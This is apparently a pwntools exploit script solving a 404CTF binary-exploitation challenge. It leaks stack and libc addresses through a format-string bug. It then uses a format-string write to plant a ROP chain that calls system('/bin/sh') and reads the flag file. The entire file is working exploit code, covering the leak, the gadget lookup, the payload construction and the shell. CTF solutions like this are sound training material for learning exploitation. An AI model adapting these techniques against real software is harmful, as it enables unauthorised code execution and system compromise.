#!/usr/bin/env python3

from pwnlib.fmtstr import fmtstr_payload
from pwn import *
from time import sleep


HOST = "challenges.404ctf.fr"
PORT = 30242


def main():

    if args.REMOTE:
        exe = ELF("./une_citation_pas_comme_les_autres_2_2")
        context.binary = exe.path
        r = remote(HOST, PORT)
        libc = ELF("./libc-2.27.so")
        SHIFT = 231

    elif args.TRACE:
        exe = ELF("./une_citation_pas_comme_les_autres_2_2")
        context.binary = exe.path
        r  = process(["strace", "-o","strace.out", exe.path])
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        SHIFT = 234

    elif args.PATCH:
        exe = ELF("./citation_patched")
        libc = ELF("./libc-2.27.so")
        context.binary = exe.path
        r = process([exe.path])
        SHIFT = 231

    else:
        exe = ELF("./une_citation_pas_comme_les_autres_2_2")
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        context.binary = exe.path
        r = process([exe.path])
        SHIFT = 234

    cit1 = b"M'accuser, - justes dieux ! - De n'aimer plus... quand... j'aime plus !"
    cit2 = b"L'amour grandit berce dans mon ame inquiete... Que ce... cruel marmot prit pour... barcelonnette !"
    cit3 = b"Aussi l'ai-je tente, mais... tentative nulle. Ce... nouveau-ne, Madame, est un petit... Hercule."
    cit4 = b"De sorte qu'il... strangula comme rien... Les deux serpents... Orgueil et... Doute."


    rep = r.recvuntil(b'>> ')
    r.send(b'1\n')
    rep = r.recvuntil(b'>> ')
    r.send(b'1\n')
    rep = r.recvuntil(b'[Vous] : ')
    r.send(cit1 + b'\n')
    rep = r.recvuntil(b'[Vous] : ')
    r.send(cit2 + b'\n')
    rep = r.recvuntil(b'[Vous] : ')
    r.send(cit3 + b'\n')
    rep = r.recvuntil(b'[Vous] : ')
    r.send(cit4 + b'\n')
    rep = r.recvuntil(b'[Vous] : ')

    # First format string leak usefull addresses
    r.send(b'%25$p%79$p' + b'\n')
    rep = r.recvuntil(b'prie.\n')
    leak = rep.split(b', ')[0]
    leak = leak.split(b'0x')
    leak_stack = int(leak[1],16)
    leak_start = int(leak[2],16)

    log.info(f"leak_stack : {hex(leak_stack)}")
    log.info(f"Leak start : {hex(leak_start)}")

    # find gadget and symbols
    rop = ROP(libc)
    gadget_pop = rop.find_gadget(['pop rdi', 'ret'])
    ROP_pop_rdi_ret = gadget_pop.address

    gadget_pop = rop.find_gadget(['ret'])
    ROP_ret = gadget_pop.address

    address_libc_start_main = libc.symbols['__libc_start_main']
    system = libc.symbols['system']
    STR_binsh = next(libc.search(b'/bin/sh'))

    print(f"start_main : {hex(address_libc_start_main)}")
    print(f"pop : {hex(ROP_pop_rdi_ret)}")
    print(f"ret : {hex(ROP_ret)}")
    print(f"system : {hex(system)}")
    print(f"binsh : {hex(STR_binsh)}")

    # because in fact leak_start is __libc_start_main+234 local or +231 remote
    leak_start = leak_start - SHIFT
    offset = leak_start - address_libc_start_main

    # compute addresses
    system = offset + system
    STR_binsh = offset + STR_binsh
    ROP_pop_rdi_ret = offset + ROP_pop_rdi_ret
    ROP_ret = offset + ROP_ret

    print(f"pop : {hex(ROP_pop_rdi_ret)}")
    print(f"system : {hex(system)}")
    print(f"binsh : {hex(STR_binsh)}")

    ret_printf = leak_stack - 0xd8

    payload =  fmtstr_payload(32, {
        ret_printf     :  ROP_ret,
        ret_printf +  8:  ROP_pop_rdi_ret,
        ret_printf + 16:  STR_binsh,
        ret_printf + 24:  system,
        }, write_size='short', numbwritten=0)

    r.send( payload + b'\x00'*8 + b'\n')

    r.recvuntil(b'\x7f').replace(b' ',b'')
    r.send(b'cat flag.txt\n')
    print(r.recv().decode())


if __name__ == "__main__":
	main()
